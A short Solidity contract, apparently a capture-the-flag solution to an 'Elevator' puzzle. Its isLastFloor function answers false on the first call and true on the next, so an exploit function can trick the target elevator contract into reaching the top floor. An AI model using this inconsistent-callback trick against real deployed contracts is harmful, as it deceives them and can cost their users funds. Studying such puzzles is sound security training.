pragma solidity >=0.4.22 <0.6.0;

interface Building {  
    function isLastFloor(uint) payable external returns (bool);
}

contract ArichBuilding is Building {
    uint public lastFloor = 66;
    Elevator elevator;
    address public caddress;
    bool called = false;

    constructor(address _target) public {
        caddress = _target;
        elevator = Elevator(_target);
    }

    function isLastFloor(uint _floor) payable public returns (bool)  {
        bool retval = false;
        if ((lastFloor == _floor) && (! called)) {
            called = true;
        }
        else {
            called = false;
            retval = true;
        }
        return retval;
    }

    function exploit(uint fnumber) public returns(bool) {
        elevator.goTo(fnumber);
        return true;
    }
}

contract Elevator {
    function goTo(uint _floor) public { }
}

